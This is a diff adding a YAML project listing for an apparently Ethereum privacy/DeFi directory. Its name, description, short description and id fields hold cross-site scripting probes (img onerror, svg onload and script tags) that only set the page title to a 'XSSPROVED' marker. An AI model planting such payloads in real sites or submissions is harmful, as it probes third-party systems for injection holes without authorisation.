@@ -1,0 +1,18 @@
+name: XSSPROBE_<img src=x onerror=document.title='XSSPROVED_SUBMIT'>
+description: <svg/onload=document.title='XSSPROVED_DESC'>
+short_description: <script>document.title='XSSPROVED_SHORT'</script>
+links: {}
+categories:
+  - Privacy
+ecosystems:
+  - Ethereum
+usecases:
+  - DeFi
+tokens: []
+privacy_policy:
+  link: ""
+  defined: false
+project_status:
+  version: mainnet
+logo_url: ""
+id: xssprobe_<img-src=x-onerror=document.title='xssproved_submit'>
